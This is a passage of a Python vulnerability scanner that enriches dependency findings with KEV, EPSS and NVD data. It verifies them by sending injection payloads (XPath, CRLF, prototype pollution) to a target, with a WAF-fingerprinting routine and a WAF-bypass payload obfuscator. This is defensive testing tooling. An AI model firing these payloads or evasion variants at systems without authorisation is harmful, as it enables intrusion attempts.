            "' or count(/*)>0 or '1'='1",
        ],
        "detect": "pattern",
        "signatures": XPATH_SIGNATURES,
    },
    "CWE-113": {
        "label": "HTTP Header Injection (CRLF)",
        "payloads": [
            "%0d%0aX-Injected:%20true",
            "\r\nX-Injected: true",
            "%0aX-Injected:%20true",
        ],
        "detect": "pattern",
        "signatures": CRLF_SIGNATURES,
    },
    "CWE-1321": {
        "label": "Prototype Pollution",
        "payloads": [
            '{"__proto__": {"polluted": "yes"}}',
            '{"constructor": {"prototype": {"polluted": "yes"}}}',
        ],
        "detect": "pattern",
        "signatures": {"polluted": r"polluted", "proto_leak": r"__proto__"},
    },
}


# ================================================================
# SIGNATURE HELPERS
# ================================================================
def _normalize_signatures(signatures) -> Iterable[Tuple[str, str]]:
    """Yield (label, pattern) from either a dict or a (pattern, label) list."""
    if isinstance(signatures, dict):
        for label, pattern in signatures.items():
            yield label, pattern
    else:
        for item in signatures:
            if isinstance(item, tuple) and len(item) == 2:
                pattern, label = item
                yield label, pattern


def match_signatures(
    text: str, signatures,
    *, baseline_text: Optional[str] = None,
    case_insensitive: bool = True,
) -> List[str]:
    flags = re.IGNORECASE if case_insensitive else 0
    hits: List[str] = []
    for label, pattern in _normalize_signatures(signatures):
        try:
            if not re.search(pattern, text, flags):
                continue
            if baseline_text and re.search(pattern, baseline_text, flags):
                continue
            hits.append(label)
        except re.error:
            continue
    return hits


def detect_waf(status_code: int, headers: Dict[str, str], body: str) -> Optional[dict]:
    h = {k.lower(): str(v).lower() for k, v in headers.items()}
    b = (body or "").lower()
    for vendor, fp in WAF_FINGERPRINTS.items():
        evidence: List[str] = []
        for hh in fp.get("headers", []):
            if ":" in hh:
                k, v = hh.split(":", 1)
                if h.get(k.strip()) and v.strip() in h[k.strip()]:
                    evidence.append(f"header:{hh}")
            elif hh in h:
                evidence.append(f"header:{hh}")
        for phrase in fp.get("body", []):
            if phrase in b:
                evidence.append(f"body:{phrase}")
        for c in fp.get("cookies", []):
            if c.lower() in h.get("set-cookie", ""):
                evidence.append(f"cookie:{c}")
        if status_code in fp.get("status", []) and evidence:
            evidence.append(f"status:{status_code}")
        if evidence:
            return {"vendor": vendor, "evidence": evidence}
    return None


def obfuscate_payload(payload: str) -> List[str]:
    variants = [payload]
    for kw in ("SELECT", "UNION", "SLEEP", "AND", "OR", "WHERE", "FILE"):
        if kw in payload.upper():
            variants.append(payload.replace(kw, kw.lower()))
            variants.append(payload.replace(kw, kw.title()))
    variants.append(payload.replace(" ", "/**/"))
    variants.append(payload.replace(" ", "%20"))
    variants.append(quote(quote(payload, safe="")))
    return list(dict.fromkeys(variants))


# ================================================================
# HTTP
# ================================================================
def build_session(insecure: bool = False, user_headers: Optional[dict] = None,
                  basic_auth: Optional[Tuple[str, str]] = None,
                  cookie: Optional[str] = None) -> requests.Session:
    s = requests.Session()
    s.headers.update({"User-Agent": f"cve-scanner/{__version__}"})
    if user_headers:
        s.headers.update(user_headers)
    if basic_auth:
        s.auth = basic_auth
    if cookie:
        s.headers["Cookie"] = cookie
    s.verify = not insecure
    retry = Retry(total=3, backoff_factor=0.5,
                  status_forcelist=(429, 500, 502, 503, 504),
                  allowed_methods=frozenset(["GET", "POST", "HEAD"]))
    adapter = HTTPAdapter(max_retries=retry, pool_connections=20, pool_maxsize=20)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    return s


def http_get(url: str, params=None, headers=None, timeout=30) -> dict:
    h = {"User-Agent": f"cve-scanner/{__version__}", **(headers or {})}
    r = requests.get(url, params=params, headers=h, timeout=timeout)
    r.raise_for_status()
    return r.json()


def http_post(url: str, data: dict, timeout=30) -> dict:
    h = {"User-Agent": f"cve-scanner/{__version__}"}
    r = requests.post(url, json=data, headers=h, timeout=timeout)
    r.raise_for_status()
    return r.json()


# ================================================================
# CACHE
# ================================================================
def load_cache(name: str, max_age_hours: float = 24.0) -> Optional[dict]:
    p = CACHE_DIR / f"{name}.json"
    if not p.exists():
        return None
    if (time.time() - p.stat().st_mtime) / 3600.0 > max_age_hours:
        return None
    try:
        return json.loads(p.read_text())
    except Exception:
        return None


def save_cache(name: str, data: dict) -> None:
    tmp: Optional[Path] = None
    try:
        with tempfile.NamedTemporaryFile(
            "w", dir=CACHE_DIR, delete=False,
            prefix=f"{name}.", suffix=".tmp"
        ) as fh:
            tmp = Path(fh.name)
            json.dump(data, fh)
        tmp.replace(CACHE_DIR / f"{name}.json")
    except Exception:
        if tmp and tmp.exists():
            try:
                tmp.unlink()
            except Exception:
                pass


# ================================================================
# KEV / EPSS / NVD
# ================================================================
def fetch_kev() -> Dict[str, dict]:
    c = load_cache("kev", max_age_hours=12)
    if c:
        return c
    log.info("Downloading CISA KEV catalog...")
    data = http_get(KEV_URL)
    kev = {v["cveID"]: v for v in data.get("vulnerabilities", [])}
    save_cache("kev", kev)
    return kev


def fetch_epss_batch(cve_ids: List[str]) -> Dict[str, float]:
    if not cve_ids:
        return {}
    out: Dict[str, float] = {}
    for i in range(0, len(cve_ids), 50):
        chunk = cve_ids[i:i + 50]
        try:
            data = http_get(EPSS_API, params={"cve": ",".join(chunk)})
            for item in data.get("data", []):
                out[item["cve"]] = float(item.get("epss", 0.0))
        except Exception as e:
            log.warning(f"EPSS query failed: {e}")
    return out


def fetch_nvd_cve(cve_id: str, _retry: int = 0) -> Optional[dict]:
    params = {"cveId": cve_id}
    headers = {}
    if NVD_API_KEY:
        headers["apiKey"] = NVD_API_KEY
    try:
        data = http_get(NVD_API, params=params, headers=headers)
        vulns = data.get("vulnerabilities", [])
        return vulns[0]["cve"] if vulns else None
    except requests.HTTPError as e:
        if e.response is not None and e.response.status_code == 429:
            if _retry >= NVD_MAX_RETRIES:
                log.warning(f"NVD rate limit exceeded for {cve_id}")
                return None
            wait = 30 * (2 ** _retry)
            log.info(f"NVD rate limited, sleeping {wait}s...")
            time.sleep(wait)
            return fetch_nvd_cve(cve_id, _retry + 1)
        log.warning(f"NVD lookup failed for {cve_id}: {e}")
        return None
    except (requests.ConnectionError, requests.Timeout):
        if _retry >= NVD_MAX_RETRIES:
            return None
        time.sleep(2 ** _retry)
        return fetch_nvd_cve(cve_id, _retry + 1)
    finally:
        time.sleep(NVD_RATE_SLEEP)


def extract_cvss(nvd: dict) -> Optional[float]:
    m = nvd.get("metrics", {})
    for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV40", "cvssMetricV2"):
        if key in m and m[key]:
            try:
                return float(m[key][0]["cvssData"]["baseScore"])
            except (KeyError, TypeError, ValueError):
                continue
    return None


def extract_cwe(nvd: dict) -> List[str]:
    cwes: List[str] = []
    for w in nvd.get("weaknesses", []):
        for d in w.get("description", []):
            v = d.get("value", "")
            if v.startswith("CWE-") and v not in cwes:
                cwes.append(v)
    return cwes


# ================================================================
# OSV
# ================================================================
def parse_requirements(path: Path) -> List[Tuple[str, str]]:
    deps = []
    for line in path.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("-"):
            continue
        m = re.match(r"^([A-Za-z0-9_.-]+)\s*==\s*([^\s;#]+)", line)
        if m:
            deps.append((m.group(1), m.group(2)))
            continue
        m2 = re.match(r"^([A-Za-z0-9_.-]+)", line)
        if m2:
            deps.append((m2.group(1), ""))
    return deps


def parse_package_json(path: Path) -> List[Tuple[str, str]]:
    data = json.loads(path.read_text())
    deps = []
    for section in ("dependencies", "devDependencies"):
        for name, ver in data.get(section, {}).items():
            deps.append((name, re.sub(r"^[~^>=<]+", "", ver).strip()))
    return deps


def osv_query(package: str, version: str, ecosystem: str) -> List[dict]:
    if not version:
        return []
    payload = {"package": {"name": package, "ecosystem": ecosystem}, "version": version}
    try:
        return http_post(OSV_API, payload).get("vulns", [])
    except Exception as e:
        log.warning(f"OSV query failed {package}=={version}: {e}")
        return []


def _osv_one(args: Tuple[str, str, str]) -> List[dict]:
    pkg, ver, eco = args
    findings = []
    for v in osv_query(pkg, ver, eco):
        f = {
            "package": pkg, "version": ver, "ecosystem": eco,
            "id": v.get("id"), "aliases": v.get("aliases", []),
            "summary": v.get("summary", ""), "source": "OSV",
            "cve_id": None, "cwe": [],
        }
        for a in f["aliases"]:
            if a.startswith("CVE-"):
                f["cve_id"] = a
                break
        db = v.get("database_specific", {}) or {}
        cwe_field = db.get("cwe_ids") or db.get("cwes") or []
        if isinstance(cwe_field, list):
            f["cwe"] = [c for c in cwe_field if str(c).startswith("CWE-")]
        findings.append(f)
    return findings


def scan_dependencies(path: Path, workers: int = 8) -> List[dict]:
    if path.name == "requirements.txt":
        deps, eco = parse_requirements(path), "PyPI"
    elif path.name == "package.json":
        deps, eco = parse_package_json(path), "npm"
    else:
        log.error(f"Unsupported file: {path.name}")
        return []

    log.info(f"Scanning {path} ({len(deps)} deps, ecosystem={eco})...")
    findings: List[dict] = []
    done = 0

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {
            ex.submit(_osv_one, (pkg, ver, eco)): (pkg, ver)
            for pkg, ver in deps
        }
        for fut in as_completed(futures):
            if _SHUTDOWN.is_set():
                break
            findings.extend(fut.result())
            done += 1
            if done % 20 == 0 or done == len(deps):
                log.info(f"  Scanned {done}/{len(deps)}")
    return findings


# ================================================================
# ENRICHMENT
# ================================================================
def _enrich_one(cve_id: str) -> Tuple[str, Optional[dict]]:
    return cve_id, fetch_nvd_cve(cve_id)


def enrich_findings(findings: List[dict], workers: int = 1) -> List[dict]:
    if not findings:
        return findings

    log.info(f"Enriching {len(findings)} findings...")
    cve_ids = sorted({f["cve_id"] for f in findings if f.get("cve_id")})
    epss_map = fetch_epss_batch(cve_ids)
    kev_map = fetch_kev()

    nvd_cache: Dict[str, Optional[dict]] = {}
    if NVD_API_KEY and workers > 1 and cve_ids:
        with ThreadPoolExecutor(max_workers=min(workers, 8)) as ex:
            for cid, entry in ex.map(_enrich_one, cve_ids):
                nvd_cache[cid] = entry
    else:
        for i, cid in enumerate(cve_ids, 1):
            if _SHUTDOWN.is_set():
                break
            nvd_cache[cid] = fetch_nvd_cve(cid)
            if i % 10 == 0:
                log.info(f"  NVD enriched {i}/{len(cve_ids)}")

    for f in findings:
        cid = f.get("cve_id")
        epss = epss_map.get(cid, 0.0) if cid else 0.0
        in_kev = bool(cid and cid in kev_map)
        cvss, nvd_cwe = None, []
        entry = nvd_cache.get(cid) if cid else None
        if entry:
            cvss = extract_cvss(entry)
            nvd_cwe = extract_cwe(entry)

        merged_cwe = sorted(set((f.get("cwe") or []) + nvd_cwe))

        if in_kev:
            priority = "CRITICAL"
        elif epss >= 0.1:
            priority = "HIGH"
        elif cvss is not None and cvss >= 7.0:
            priority = "HIGH"
        elif cvss is not None and cvss >= 4.0:
            priority = "MEDIUM"
        else:
            priority = "LOW"

        f.update({"cwe": merged_cwe, "cvss": cvss, "epss": round(epss, 4),
                  "in_kev": in_kev, "priority": priority})
        status, reason = assess_false_positive(f)
        f["false_positive_status"] = status
        f["false_positive_reason"] = reason
    return findings


def ensure_metadata(findings: List[dict]) -> None:
    for f in findings:
        cid = f.get("cve_id")
        if not cid or (f.get("cwe") and f.get("cvss") is not None):
            continue
        nvd = fetch_nvd_cve(cid)
        if not nvd:
            continue
        if not f.get("cwe"):
            f["cwe"] = extract_cwe(nvd)
        if f.get("cvss") is None:
            f["cvss"] = extract_cvss(nvd)


# ================================================================
# RISK
# ================================================================
def assess_false_positive(finding: dict) -> Tuple[str, str]:
    v = finding.get("verification")
    if v:
        s = v.get("status")
        if s == "CONFIRMED":
            return ("CONFIRMED", v.get("evidence", "Active PoC confirmed"))
        if s == "NOT_REPRODUCED":
            return ("LIKELY_FALSE_POSITIVE", v.get("evidence", "PoC did not trigger"))
        if s == "WAF_BLOCKED":
            return ("UNVERIFIED", v.get("evidence", "Blocked by WAF"))

    if finding.get("in_kev"):
        return ("CONFIRMED", "Listed in CISA KEV — exploited in the wild")
    if finding.get("source") == "Nuclei":
        return ("CONFIRMED", "Nuclei template triggered")

    cve = finding.get("cve_id")
    if not cve:
        return ("LIKELY_FALSE_POSITIVE", "No CVE assigned (advisory only)")

    epss = finding.get("epss", 0.0) or 0.0
    if epss >= 0.1:
        return ("LIKELY_REAL", f"High EPSS ({epss:.2%})")

    cvss = finding.get("cvss")
    if cvss is not None and cvss >= 7.0:
        return ("LIKELY_REAL", f"High CVSS ({cvss})")
    if cvss is not None:
        return ("NEEDS_REVIEW", f"CVE assigned, CVSS {cvss}, no exploitation signals")
    return ("NEEDS_REVIEW", "CVE assigned but no CVSS/EPSS available")


# ================================================================
# INJECTION POINTS
# ================================================================
FORM_RE   = re.compile(r"<form\b[^>]*>(.*?)</form>", re.I | re.S)
NAME_RE   = re.compile(r'name=["\']([^"\']+)', re.I)
ACTION_RE = re.compile(r'action=["\']?([^"\'\s>]+)', re.I)
METHOD_RE = re.compile(r'method=["\']?([^"\'\s>]+)', re.I)


def extract_forms(html: str, base_url: str) -> List[dict]:
    forms = []
    for fm in FORM_RE.finditer(html):
        outer, inner = fm.group(0), fm.group(1)
        a = ACTION_RE.search(outer)
        m = METHOD_RE.search(outer)
        action = urljoin(base_url, a.group(1)) if a else base_url
        method = (m.group(1) if m else "GET").upper()
        params = [n.group(1) for n in NAME_RE.finditer(inner)]
        if params:
            forms.append({"url": action, "method": method, "params": params})
    return forms


def extract_injection_points(html: str, base_url: str) -> List[dict]:
    seen = set()
    points: List[dict] = []

    def add(url: str, method: str, params: List[str]):
        key = (url, method, tuple(sorted(params)))
        if key in seen:
            return
        seen.add(key)
        points.append({"url": url, "method": method, "params": params})

    parsed = urlparse(base_url)
    if parsed.query:
        add(base_url, "GET", list(parse_qs(parsed.query, keep_blank_values=True).keys()))
    for f in extract_forms(html, base_url):
        add(f["url"], f["method"], f["params"])
    return points


# ================================================================
# DETECTION
# ================================================================
@dataclass
class RateLimiter:
    rate: float = 0.0
    jitter: float = 0.0
    _last: float = 0.0

    def wait(self) -> None:
        if self.rate <= 0:
            return
        now = time.monotonic()
        min_gap = 1.0 / self.rate
        elapsed = now - self._last
        if elapsed < min_gap:
            time.sleep(min_gap - elapsed)
        if self.jitter > 0:
            import random
            time.sleep(self.jitter * (0.5 + 0.5 * random.random()))
        self._last = time.monotonic()


def send_request(session, url, method, data, timeout=15,
                 limiter: Optional[RateLimiter] = None,
                 headers: Optional[dict] = None,
                 json_body: Optional[dict] = None):
    if limiter:
        limiter.wait()
    try:
        kw = {"timeout": timeout, "allow_redirects": False}
        if headers:
            kw["headers"] = headers
        m = method.upper()
        if m == "GET":
            return session.get(url, params=data, **kw)
        if m == "HEAD":
            return session.head(url, **kw)
        if json_body is not None:
            return session.post(url, json=json_body, **kw)
        return session.post(url, data=data, **kw)
    except (requests.Timeout, requests.ConnectionError,
            requests.TooManyRedirects) as e:
        log.debug(f"request error {url}: {e}")
        return None
    except Exception as e:
        log.debug(f"unexpected error {url}: {e}")
        return None


def detect_signal(exploit, baseline, payload, probe) -> Tuple[bool, str]:
    if exploit is None or baseline is None:
        return False, "request failed"
    mode = probe["detect"]

    if mode == "xss_reflection":
        for marker in probe.get("markers", []):
            if marker in exploit.text and marker not in baseline.text:
                return True, f"marker {marker!r} reflected unescaped"
        hits = match_signatures(exploit.text, XSS_SIGNATURES,
                                baseline_text=baseline.text)
        if hits:
            return True, f"XSS signatures: {hits}"
        return False, "no reflection"

    if mode == "sql":
        delta = exploit.elapsed.total_seconds() - baseline.elapsed.total_seconds()
        if delta >= probe.get("timing_threshold", 3.0):
            return True, f"timing delta {delta:.1f}s"
        hits = match_signatures(exploit.text, SQL_ERROR_SIGNATURES,
                                baseline_text=baseline.text)
        if hits:
            return True, f"SQL error signatures: {hits}"
        return False, "no signal"

    if mode == "rce":
        delta = exploit.elapsed.total_seconds() - baseline.elapsed.total_seconds()
        if delta >= probe.get("timing_threshold", 3.0):
            return True, f"timing delta {delta:.1f}s"
        hits = match_signatures(exploit.text, RCE_SIGNATURES,
                                baseline_text=baseline.text)
        if hits:
            return True, f"RCE signatures: {hits}"
        return False, "no signal"

    if mode == "pattern":
        sigs = probe.get("signatures", {})
        hits = match_signatures(exploit.text, sigs, baseline_text=baseline.text)
        if hits:
            return True, f"signatures: {hits}"
        if payload in exploit.text and payload not in baseline.text:
            return True, "payload reflected"
        enc = quote(payload, safe="")
        if enc and enc in exploit.text and enc not in baseline.text:
            return True, "payload reflected (URL-encoded)"
        return False, "no signal"

    if mode == "ssti":
        expected = probe.get("expected", "")
        if expected and expected in exploit.text and expected not in baseline.text:
            return True, f"SSTI evaluated → {expected}"
        hits = match_signatures(exploit.text, SSTI_SIGNATURES,
                                baseline_text=baseline.text)
        if hits:
            return True, f"SSTI signatures: {hits}"
        return False, "no signal"

    if mode == "redirect":
        loc = exploit.headers.get("Location", "")
        if probe.get("expected", "evil.example.com") in loc:
            return True, f"redirects to {loc}"
        hits = match_signatures(exploit.text, OPEN_REDIRECT_SIGNATURES,
                                baseline_text=baseline.text)
        if hits:
            return True, f"redirect signatures: {hits}"
        return False, "no redirect"
    return False, f"unknown detect mode {mode}"


def is_blocked(response) -> bool:
    if response is None:
        return False
    if response.status_code in (403, 406, 429, 503):
        return True
    body = (response.text or "").lower()
    for phrase in ("blocked by", "access denied", "request rejected",
                   "firewall", "captcha", "challenge"):
        if phrase in body:
            return True
    return False


# ================================================================
# CVE VERIFICATION (NEW)
# ================================================================
def verify_with_cve(target_url: str, cve_id: str, session,
                    limiter: RateLimiter,
                    dry_run: bool = False) -> Optional[dict]:
    """Run CVE-specific PoC requests against the target."""
    probe = CVE_PROBES.get(cve_id)
    if not probe:
        return None

    n_probes = len(probe["probes"])
    if dry_run:
        paths = [p.get("path", "/") for p in probe["probes"]]
        return {
            "status": "DRY_RUN",
            "fp_status": "NEEDS_REVIEW",
            "method": f"{cve_id} {probe['label']} (dry run)",
            "evidence": f"Would test {n_probes} endpoint(s): {paths}",
        }

    log.info(f"    CVE probe: {probe['label']} ({n_probes} endpoint(s))")

    # Baseline: target root
    try:
        baseline = session.get(target_url, timeout=15, allow_redirects=False)
    except Exception as e:
        return {"status": "UNVERIFIED", "reason": f"Cannot reach target: {e}"}

    for p in probe["probes"]:
        if _SHUTDOWN.is_set():
            break
        path = p.get("path", "/")
        method = p.get("method", "GET")
        url = urljoin(target_url, path)

        exploit = send_request(
            session, url, method,
            data=p.get("data"),
            headers=p.get("headers"),
            json_body=p.get("json_body"),
            limiter=limiter,
        )
        if exploit is None:
            continue

        # Status gate
        require = p.get("require_status")
        if require and exploit.status_code not in require:
            continue

        hits = match_signatures(
            exploit.text, p.get("sig", {}),
            baseline_text=baseline.text if baseline else None,
        )
        if hits:
            return {
                "status": "CONFIRMED",
                "fp_status": "CONFIRMED",
                "method": f"{cve_id} {probe['label']}",
                "evidence": f"{url}: {hits}",
            }

    return {
        "status": "NOT_REPRODUCED",
        "fp_status": "NEEDS_REVIEW",  # can still be real via other vector
        "method": f"{cve_id} {probe['label']}",
        "evidence": f"CVE-specific probes did not trigger ({n_probes} endpoint(s) tried)",
    }


# ================================================================
# CWE VERIFICATION
# ================================================================
def _baseline_for(session, pt, limiter):
    return send_request(session, pt["url"], pt["method"],
                        {p: "safe_test_123" for p in pt["params"]},
                        limiter=limiter)


def verify_with_cwe(target_url: str, cwe: str, session,
                    limiter: RateLimiter, waf_bypass: bool,
                    dry_run: bool = False) -> Optional[dict]:
    probe = CWE_PROBES.get(cwe)
    if not probe:
        return None

    try:
        page = session.get(target_url, timeout=15, allow_redirects=True)
    except Exception as e:
        return {"status": "UNVERIFIED", "reason": f"Cannot fetch target: {e}"}

    points = extract_injection_points(page.text, target_url)
    if not points:
        return {"status": "UNVERIFIED", "reason": "No parameters or forms found"}

    log.info(f"    {probe['label']}: {len(points)} injection point(s), "
             f"{len(probe['payloads'])} payload(s)")

    if dry_run:
        return {
            "status": "DRY_RUN",
            "fp_status": "NEEDS_REVIEW",
            "method": f"{probe['label']} active PoC (dry run)",
            "evidence": f"Would test {len(points)} point(s) × "
                        f"{len(probe['payloads'])} payload(s) on {target_url}",
        }

    baselines: Dict[Tuple[str, str, Tuple[str, ...]], object] = {}

    def baseline_of(pt):
        key = (pt["url"], pt["method"], tuple(sorted(pt["params"])))
        if key not in baselines:
            baselines[key] = _baseline_for(session, pt, limiter)
        return baselines[key]

    waf_blocks = 0
    for payload in probe["payloads"]:
        if _SHUTDOWN.is_set():
            break
        variants = obfuscate_payload(payload) if waf_bypass else [payload]
        for variant in variants:
            for pt in points:
                if _SHUTDOWN.is_set():
                    break
                baseline = baseline_of(pt)
                exploit = send_request(session, pt["url"], pt["method"],
                                       {p: variant for p in pt["params"]},
                                       limiter=limiter)

                if (exploit is not None and is_blocked(exploit)
                        and not is_blocked(baseline)):
                    waf = detect_waf(exploit.status_code,
                                     dict(exploit.headers), exploit.text)
                    if waf:
                        waf_blocks += 1
                        continue

                vuln, why = detect_signal(exploit, baseline, variant, probe)
                if vuln:
                    return {
                        "status": "CONFIRMED",
                        "fp_status": "CONFIRMED",
                        "method": f"{probe['label']} active PoC",
                        "evidence": f"{pt['url']} ({pt['method']}, "
                                    f"params={pt['params']}): {why}",
                    }

    if waf_blocks:
        return {
            "status": "WAF_BLOCKED",
            "fp_status": "UNVERIFIED",
            "method": f"{probe['label']} active PoC",
            "evidence": f"{waf_blocks} request(s) blocked by WAF",
        }
    return {
        "status": "NOT_REPRODUCED",
        "fp_status": "LIKELY_FALSE_POSITIVE",
        "method": f"{probe['label']} active PoC",
        "evidence": "Payloads did not trigger any indicator",
    }


# ================================================================
# NUCLEI
# ================================================================
def check_nuclei() -> bool:
    try:
        subprocess.run(["nuclei", "-version"], capture_output=True, check=True)
        return True
    except Exception:
        return False


def verify_with_nuclei(target_url: str, cve_id: str,
                       dry_run: bool = False) -> Optional[dict]:
    if not check_nuclei():
        return None
    if dry_run:
        return {
            "status": "DRY_RUN",
            "fp_status": "NEEDS_REVIEW",
            "method": f"Nuclei {cve_id} (dry run)",
            "evidence": f"Would run nuclei -id {cve_id.lower()} against {target_url}",
        }
    log.info(f"    Running Nuclei for {cve_id}...")
    cmd = ["nuclei", "-u", target_url, "-id", cve_id.lower(),
           "-jsonl", "-silent", "-no-color"]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
    except subprocess.TimeoutExpired:
        return {"status": "UNVERIFIED", "reason": "Nuclei timed out"}

    if proc.stdout.strip():
        try:
            item = json.loads(proc.stdout.strip().split("\n")[0])
            return {
                "status": "CONFIRMED",
                "fp_status": "CONFIRMED",
                "method": f"Nuclei {cve_id}",
                "evidence": item.get("matched-at", "template triggered"),
            }
        except json.JSONDecodeError:
            pass

    err = (proc.stderr or "").lower()
    if "no templates" in err or "could not find" in err or "no results found" in err:
        return {"status": "NO_TEMPLATE", "reason": f"No Nuclei template for {cve_id}"}
    return {
        "status": "NOT_REPRODUCED",
        "fp_status": "LIKELY_FALSE_POSITIVE",
        "method": f"Nuclei {cve_id}",
        "evidence": "Template ran but did not trigger",
    }


# ================================================================
# ORCHESTRATOR
# ================================================================
def verify_findings(findings: List[dict], target_url: str,
                    *, session: requests.Session,
                    limiter: RateLimiter,
                    skip_confirmed: bool = False,
                    waf_bypass: bool = False,
                    dry_run: bool = False) -> List[dict]:
    log.info(f"Verifying {len(findings)} finding(s) against {target_url}")
    log.info("    Order: CVE-specific → Nuclei → CWE → UNVERIFIED")

    try:
        probe = session.get(target_url, timeout=15, allow_redirects=True)
        waf = detect_waf(probe.status_code, dict(probe.headers), probe.text)
        if waf:
            log.warning(f"WAF detected: {waf['vendor']} "
                        f"({', '.join(waf['evidence'][:3])})")
            log.warning("Active PoCs may be blocked. Consider --waf-bypass.")
    except Exception as e:
        log.warning(f"Could not probe target: {e}")

    for i, finding in enumerate(findings, 1):
        if _SHUTDOWN.is_set():
            log.warning("Interrupted — remaining findings left unverified.")
            break

        cve = finding.get("cve_id")
        cwe = (finding.get("cwe") or [None])[0]

        if skip_confirmed and finding.get("false_positive_status") == "CONFIRMED":
            log.info(f"[{i}/{len(findings)}] {cve or finding.get('id')} — skipped")
            continue

        log.info(f"[{i}/{len(findings)}] {cve or finding.get('id')} "
                 f"(CWE: {cwe or 'N/A'})")

        attempts: List[dict] = []
        confirmed_result: Optional[dict] = None

        # 1. CVE-specific probe
        if cve and cve in CVE_PROBES:
            r = verify_with_cve(target_url, cve, session, limiter, dry_run)
            if r:
                attempts.append(r)
                if r["status"] == "CONFIRMED":
                    confirmed_result = r

        # 2. Nuclei per-CVE
        if not confirmed_result and cve:
            r = verify_with_nuclei(target_url, cve, dry_run=dry_run)
            if r:
                attempts.append(r)
                if r["status"] == "CONFIRMED":
                    confirmed_result = r

        # 3. CWE probe
        if not confirmed_result and cwe:
            r = verify_with_cwe(target_url, cwe, session, limiter,
                                waf_bypass, dry_run=dry_run)
            if r:
                attempts.append(r)
                if r["status"] == "CONFIRMED":
                    confirmed_result = r

        # Decide final status
        if confirmed_result:
            finding["verification"] = confirmed_result
            log.info(f"    -> CONFIRMED: {confirmed_result.get('evidence','')[:100]}")
        elif attempts:
            # Best non-confirmed outcome, prioritized
            priority = {"WAF_BLOCKED": 0, "NOT_REPRODUCED": 1,
                        "NO_TEMPLATE": 2, "UNVERIFIED": 3, "DRY_RUN": 4}
            attempts.sort(key=lambda r: priority.get(r.get("status"), 9))
            finding["verification"] = attempts[0]
            log.info(f"    -> {attempts[0]['status']}: "
                     f"{attempts[0].get('evidence', attempts[0].get('reason',''))[:100]}")
        else:
            finding["verification"] = {
                "status": "UNVERIFIED",
                "reason": "No CVE probe, Nuclei template, or CWE probe available",
            }
            log.info("    -> UNVERIFIED (no PoC available)")

        # Record all attempts for the audit trail
        if attempts:
            finding["verification_attempts"] = [
                {"method": a.get("method"), "status": a.get("status"),
                 "evidence": a.get("evidence", a.get("reason", ""))}
                for a in attempts
            ]

        time.sleep(1)

    for f in findings:
        status, reason = assess_false_positive(f)
        f["false_positive_status"] = status
        f["false_positive_reason"] = reason
    return findings


# ================================================================
# NUCLEI DAST
# ================================================================
def run_nuclei_dast(target: str, severity: str = "critical,high,medium",
                    tags: str = "cve,vkev,kev", timeout: int = 900) -> List[dict]:
    if not check_nuclei():
        log.error("Nuclei not installed. "
                  "Get it: https://github.com/projectdiscovery/nuclei")
        return []
    log.info(f"Running Nuclei against {target} (tags={tags})...")
    cmd = ["nuclei", "-u", target, "-tags", tags, "-jsonl", "-silent",
           "-no-color", "-severity", severity]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        log.error(f"Nuclei timed out ({timeout}s)")
        return []

    findings = []
    for line in proc.stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            item = json.loads(line)
        except json.JSONDecodeError:
            continue
        info = item.get("info", {})
        cls = info.get("classification", {}) or {}
        cves = cls.get("cve-id") or []
        cwes = cls.get("cwe-id") or []
        if isinstance(cves, str): cves = [cves]
        if isinstance(cwes, str): cwes = [cwes]
        findings.append({
            "package": target, "version": "", "ecosystem": "DAST",
            "id": item.get("template-id"), "aliases": [],
            "summary": info.get("name", ""), "source": "Nuclei",
            "cve_id": cves[0] if cves else None,
            "cwe": [str(c) for c in cwes if str(c).startswith("CWE-")],
            "matched_at": item.get("matched-at"),
            "severity": str(info.get("severity", "unknown")).upper(),
        })
    return findings


# ================================================================
# REPORTING
# ================================================================
CSV_FIELDS = [
    "priority", "false_positive_status", "false_positive_reason",
    "cve_id", "id", "cwe", "cwe_name", "cvss", "epss", "in_kev",
    "package", "version", "ecosystem", "summary", "matched_at", "source",
]


def _cwe_name_for(row: dict) -> str:
    cwes = row.get("cwe") or []
    return cwe_friendly(cwes[0]) if cwes else "Unknown"


def save_json(findings: List[dict], path: Path) -> None:
    path.write_text(json.dumps(findings, indent=2, ensure_ascii=False))
    print(f"[+] JSON saved: {path}")


def save_csv(findings: List[dict], path: Path) -> None:
    with path.open("w", newline="", encoding="utf-8") as fh:
        w = csv.DictWriter(fh, fieldnames=CSV_FIELDS, extrasaction="ignore")
        w.writeheader()
        for f in findings:
            row = dict(f)
            row["cwe"] = ",".join(f.get("cwe") or [])
            row["cwe_name"] = _cwe_name_for(row)
            w.writerow(row)
    print(f"[+] CSV saved:  {path}")


def save_sarif(findings: List[dict], path: Path) -> None:
    rules, results = {}, []
    for f in findings:
        cwe = (f.get("cwe") or ["unknown"])[0]
        rule_id = f.get("cve_id") or f.get("id") or cwe
        if rule_id not in rules:
            rules[rule_id] = {
                "id": rule_id,
                "name": cwe_friendly(cwe),
                "shortDescription": {"text": f.get("summary") or cwe_friendly(cwe)},
                "properties": {"cwe": cwe, "cvss": f.get("cvss"),
                               "epss": f.get("epss"), "in_kev": f.get("in_kev")},
            }
        level = "note"
        if f.get("priority") in ("CRITICAL", "HIGH"): level = "error"
        elif f.get("priority") == "MEDIUM": level = "warning"
        results.append({
            "ruleId": rule_id, "level": level,
            "message": {"text": f"{cwe_friendly(cwe)} in "
                                f"{f.get('package','?')} {f.get('version','')} — "
                                f"{f.get('false_positive_status','')}"},
            "locations": [{"physicalLocation": {"artifactLocation": {
                "uri": f.get("matched_at") or f.get("package", "unknown")}}}],
            "properties": {"cve": f.get("cve_id"), "cwe": cwe,
                           "fp_status": f.get("false_positive_status"),
                           "fp_reason": f.get("false_positive_reason")},
        })
    sarif = {
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "version": "2.1.0",
        "runs": [{"tool": {"driver": {
            "name": "cve_scanner", "version": __version__,
            "rules": list(rules.values()),
        }}, "results": results}],
    }
    path.write_text(json.dumps(sarif, indent=2))
    print(f"[+] SARIF saved: {path}")


def save_html(findings: List[dict], path: Path) -> None:
    order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "UNKNOWN": 4}
